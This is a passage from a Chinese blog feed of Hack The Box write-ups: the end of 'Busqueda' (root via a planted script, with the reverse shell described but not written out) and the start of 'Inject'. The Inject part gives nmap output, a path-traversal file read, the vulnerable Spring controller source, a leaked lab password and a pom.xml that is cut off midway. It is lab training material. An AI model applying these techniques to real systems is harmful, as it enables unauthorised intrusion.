<code>full-checkup.sh</code> 文件，内容如下。并在当前目录下执行该命令，发现成功提权。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/21.png" alt="image.png"></p><ul><li>使用bash反弹shell命令替换<code>id</code>命令,获取root权限的shell，最终成功读取root.txt。</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/22.png" alt="image.png"></p><h2 id="Surmary"><a href="#Surmary" class="headerlink" title="Surmary"></a>Surmary</h2><ul><li>理清思路，不要盲目地乱渗透；</li><li>善用搜索引擎。</li></ul>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hackthebox</tag>
      
      <tag>python3-eval</tag>
      
      <tag>gitea</tag>
      
      <tag>docker inspect</tag>
      
      <tag>suid</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-inject</title>
    <link href="/2023/04/22/HTB-inject/"/>
    <url>/2023/04/22/HTB-inject/</url>
    
    <content type="html"><![CDATA[<h2 id="Introduce"><a href="#Introduce" class="headerlink" title="Introduce"></a>Introduce</h2><p>Rate : EASY<br>OS : Linux</p><p>主要考察spring-boot相关漏洞，ansible playbook 基本知识。</p><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><ul><li><p>nmap –min-rate 10000 -p- -oN nmap&#x2F;port 10.10.11.204</p><figure class="highlight vhdl"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><pre><code class="hljs vhdl">Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.204</span><br>Host <span class="hljs-keyword">is</span> up (<span class="hljs-number">0.28</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">65533</span> closed tcp ports (reset)<br><span class="hljs-keyword">PORT</span>     STATE SERVICE<br><span class="hljs-number">22</span>/tcp   <span class="hljs-keyword">open</span>  ssh<br><span class="hljs-number">8080</span>/tcp <span class="hljs-keyword">open</span>  http-proxy<br></code></pre></td></tr></table></figure></li><li><p>nmap -sT -sV -O -p22,8080 -sC -oN nmap&#x2F;detail 10.10.11.204</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Nmap scan report for <span class="hljs-number">10.10</span>.<span class="hljs-number">11.204</span><br>Host is up (<span class="hljs-number">0.27</span>s latency).<br><br>PORT     STATE SERVICE     VERSION<br><span class="hljs-number">22</span>/tcp   open  ssh         OpenSSH <span class="hljs-number">8.2</span>p<span class="hljs-number">1</span> Ubuntu <span class="hljs-number">4</span>ubuntu<span class="hljs-number">0.5</span> (Ubuntu Linux<span class="hljs-comment">; protocol 2.0)</span><br>\| ssh-hostkey:<br>\|   <span class="hljs-number">3072</span> caf<span class="hljs-number">10</span><span class="hljs-keyword">c</span><span class="hljs-number">515</span>a<span class="hljs-number">596277</span>f<span class="hljs-number">0</span>a<span class="hljs-number">80</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>ddaf<span class="hljs-number">8</span> (RSA)<br>\|   <span class="hljs-number">256</span> d<span class="hljs-number">51</span><span class="hljs-keyword">c</span><span class="hljs-number">81</span><span class="hljs-keyword">c</span><span class="hljs-number">97</span>b<span class="hljs-number">076</span>b<span class="hljs-number">1</span><span class="hljs-keyword">cc</span><span class="hljs-number">1</span>b<span class="hljs-number">429254</span>b<span class="hljs-number">52219</span>f (ECDSA)<br>|\_  <span class="hljs-number">256</span> db<span class="hljs-number">1</span>d<span class="hljs-number">8</span>ceb<span class="hljs-number">9472</span>b<span class="hljs-number">0</span>d<span class="hljs-number">3</span>ed<span class="hljs-number">44</span>b<span class="hljs-number">96</span><span class="hljs-keyword">c</span><span class="hljs-number">93</span>a<span class="hljs-number">7</span>f<span class="hljs-number">91</span>d (ED<span class="hljs-number">25519</span>)<br><span class="hljs-number">8080</span>/tcp open  nagios-nsca Nagios NSCA<br>|\_http-title: Home<br>Warning: OSScan results may be unreliable because we could not find at least <span class="hljs-number">1</span> open <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> closed port<br>Aggressive OS guesses: Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span> (<span class="hljs-number">96</span>%)<span class="hljs-punctuation">,</span> Linux <span class="hljs-number">4.15</span> - <span class="hljs-number">5.6</span> (<span class="hljs-number">95</span>%)<span class="hljs-punctuation">,</span> Linux <span class="hljs-number">5.0</span> - <span class="hljs-number">5.3</span> (<span class="hljs-number">95</span>%)<span class="hljs-punctuation">,</span> Linux <span class="hljs-number">5.3</span> - <span class="hljs-number">5.4</span> (<span class="hljs-number">95</span>%)<span class="hljs-punctuation">,</span> Linux <span class="hljs-number">3.1</span> (<span class="hljs-number">94</span>%)<span class="hljs-punctuation">,</span> Linux <span class="hljs-number">3.2</span> (<span class="hljs-number">94</span>%)<span class="hljs-punctuation">,</span> AXIS <span class="hljs-number">210</span>A <span class="hljs-keyword">or</span> <span class="hljs-number">211</span> Network Camera (Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">17</span>) (<span class="hljs-number">94</span>%)<span class="hljs-punctuation">,</span> Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">38</span> (<span class="hljs-number">93</span>%)<span class="hljs-punctuation">,</span> ASUS RT-N<span class="hljs-number">56</span>U WAP (Linux <span class="hljs-number">3.4</span>) (<span class="hljs-number">93</span>%)<span class="hljs-punctuation">,</span> Linux <span class="hljs-number">3.16</span> (<span class="hljs-number">93</span>%)<br>No <span class="hljs-keyword">exact</span> OS matches for host (test conditions non-ideal).<br>Network Distance: <span class="hljs-number">2</span> hops<br>Service Info: OS: Linux<span class="hljs-comment">; CPE: cpe:/o\:linux\:linux\_kernel</span><br></code></pre></td></tr></table></figure></li><li><p>nmap -sU -p22,8080 -oN nmap&#x2F;udp 10.10.11.204</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Nmap</span> scan report for <span class="hljs-number">10.10.11.204</span><br><span class="hljs-attribute">Host</span> is up (<span class="hljs-number">0</span>.<span class="hljs-number">27</span>s latency).<br><br><span class="hljs-attribute">PORT</span>     STATE  SERVICE<br><span class="hljs-attribute">22</span>/udp   closed ssh<br><span class="hljs-attribute">8080</span>/udp closed http-alt<br></code></pre></td></tr></table></figure></li><li><p>nmap –script&#x3D;vuln -p22,8080 -oN nmap&#x2F;vuln 10.10.11.204</p></li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Starting Nmap <span class="hljs-number">7.93</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2023</span><span class="hljs-number">-04</span><span class="hljs-number">-23</span> <span class="hljs-number">17</span>:<span class="hljs-number">42</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.204</span><br>Host is up (<span class="hljs-number">0.28</span>s latency).<br><br>PORT     STATE SERVICE<br><span class="hljs-number">22</span>/tcp   <span class="hljs-built_in">open</span>  ssh<br><span class="hljs-number">8080</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>-proxy<br>| <span class="hljs-keyword">http</span>-enum: <br>|   /register/: Potentially interesting <span class="hljs-built_in">folder</span><br>|_  /upload/: Potentially interesting <span class="hljs-built_in">folder</span><br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">1267.74</span> <span class="hljs-built_in">seconds</span><br></code></pre></td></tr></table></figure><h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><ul><li>访问8080端口，存在一个网站</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/1.png" alt="image"></p><ul><li>blog 里面发现两个用户名 <code>admin</code> 和  <code>Brandon Auger</code> 。</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/2.png" alt="image"></p><ul><li>访问upload，通过测试发现，文件上传功能只是检查了上传文件后缀，且采用了白名单，只允许 gif，jpeg和png文件。</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/3.png" alt="image"></p><ul><li>上传文件后，发现点击 View your Image 即可访问上传图片。</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/4.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/5.png" alt="image"></p><h2 id="User-Privilege"><a href="#User-Privilege" class="headerlink" title="User Privilege"></a>User Privilege</h2><ul><li>抓包，尝试控制 img 参数，发现存在任意文件读取和目录遍历漏洞。</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/6.png" alt="image"></p><ul><li>发现home目录下存在两个用户目录 phil 和 frank。</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/7.png" alt="image"></p><ul><li>发现不能读取 phil 目录下的 user.txt 文件 ，应该是权限问题</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/8.png" alt="image"></p><ul><li>查看webapp关键源码 UserController.java</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">String</span> <span class="hljs-variable constant_">UPLOADED_FOLDER</span> = <span class="hljs-string">&quot;/var/www/WebApp/src/main/uploads/&quot;</span>;<br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">homePage</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;homepage&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/register&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">signUpFormGET</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;under&quot;</span>;<br>    &#125;<br>    <span class="hljs-meta">@RequestMapping</span>(value = <span class="hljs-string">&quot;/upload&quot;</span>, method = <span class="hljs-title class_">RequestMethod</span>.<span class="hljs-property">GET</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title class_">UploadFormGet</span>()&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;upload&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping</span>(value = <span class="hljs-string">&quot;/show_image&quot;</span>, method = <span class="hljs-title class_">RequestMethod</span>.<span class="hljs-property">GET</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">ResponseEntity</span> <span class="hljs-title function_">getImage</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span>(<span class="hljs-string">&quot;img&quot;</span>) <span class="hljs-built_in">String</span> name</span>) &#123;<br>        <span class="hljs-title class_">String</span> fileName = <span class="hljs-variable constant_">UPLOADED_FOLDER</span> + name;<br>        <span class="hljs-title class_">Path</span> path = <span class="hljs-title class_">Paths</span>.<span class="hljs-title function_">get</span>(fileName);<br>        <span class="hljs-title class_">Resource</span> resource = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            resource = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlResource</span>(path.<span class="hljs-title function_">toUri</span>());<br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">MalformedURLException</span> e)&#123;<br>            e.<span class="hljs-title function_">printStackTrace</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ResponseEntity</span>.<span class="hljs-title function_">ok</span>().<span class="hljs-title function_">contentType</span>(<span class="hljs-title class_">MediaType</span>.<span class="hljs-property">IMAGE_JPEG</span>).<span class="hljs-title function_">body</span>(resource);<br>    &#125;<br>    <br>    <span class="hljs-meta">@PostMapping</span>(<span class="hljs-string">&quot;/upload&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title class_">Upload</span>(<span class="hljs-meta">@RequestParam</span>(<span class="hljs-string">&quot;file&quot;</span>) <span class="hljs-title class_">MultipartFile</span> file, <span class="hljs-title class_">Model</span> model)&#123;<br>        <span class="hljs-title class_">String</span> fileName = <span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">cleanPath</span>(file.<span class="hljs-title function_">getOriginalFilename</span>());<br>        <span class="hljs-keyword">if</span> (!file.<span class="hljs-title function_">isEmpty</span>() &amp;&amp; !fileName.<span class="hljs-title function_">contains</span>(<span class="hljs-string">&quot;/&quot;</span>))&#123;<br>            <span class="hljs-title class_">String</span> mimetype = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MimetypesFileTypeMap</span>().<span class="hljs-title function_">getContentType</span>(fileName);<br>            <span class="hljs-title class_">String</span> <span class="hljs-keyword">type</span> = mimetype.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">0</span>];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span>.<span class="hljs-title function_">equals</span>(<span class="hljs-string">&quot;image&quot;</span>))&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-title class_">Path</span> path = <span class="hljs-title class_">Paths</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable constant_">UPLOADED_FOLDER</span>+fileName);<br>                    <span class="hljs-title class_">Files</span>.<span class="hljs-title function_">copy</span>(file.<span class="hljs-title function_">getInputStream</span>(),path, <span class="hljs-title class_">StandardCopyOption</span>.<span class="hljs-property">REPLACE_EXISTING</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">IOException</span> e)&#123;<br>                    e.<span class="hljs-title function_">printStackTrace</span>();<br>                &#125;<br>                model.<span class="hljs-title function_">addAttribute</span>(<span class="hljs-string">&quot;name&quot;</span>, fileName);<br>                model.<span class="hljs-title function_">addAttribute</span>(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;Uploaded!&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                model.<span class="hljs-title function_">addAttribute</span>(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;Only image files are accepted!&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            model.<span class="hljs-title function_">addAttribute</span>(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;Please Upload a file!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;upload&quot;</span>;<br>    &#125;<br>    <br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/release_notes&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">changelog</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;change&quot;</span>;<br>    &#125;<br>    <br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/blogs&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">blogPage</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;blog&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>MimetypesFileTypeMap 类是 Java 标准库中的一部分，它提供了一个方法 getContentType(String filename)，可以根据指定的文件名来获取对应的 MIME 类型。该方法的实现基于文件名的后缀名，它会查询内部维护的 MIME 类型映射表（通过读取 &#x2F;etc&#x2F;mime.types 文件），找到与文件后缀名对应的 MIME 类型，并返回给调用者。如果找不到对应的 MIME 类型，则返回 application&#x2F;octet-stream 类型，表示未知的二进制文件。</p></blockquote><ul><li>查看frank 用户目录下的文件，发现敏感信息： <code>phil:DocPhillovestoInject123</code></li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/9.png" alt="image"></p><ul><li>尝试使用该密码通过ssh登录phil,frank,root都失败了(事后发现，没有开启ssh)</li><li>查看 <code>pom.xml</code> webapp配置文件</li></ul><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>WebApp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>WebApp<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Demo project for Spring Boot<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.sun.activation<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.activation<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-devtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-function-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.webjars<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>bootstrap<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span 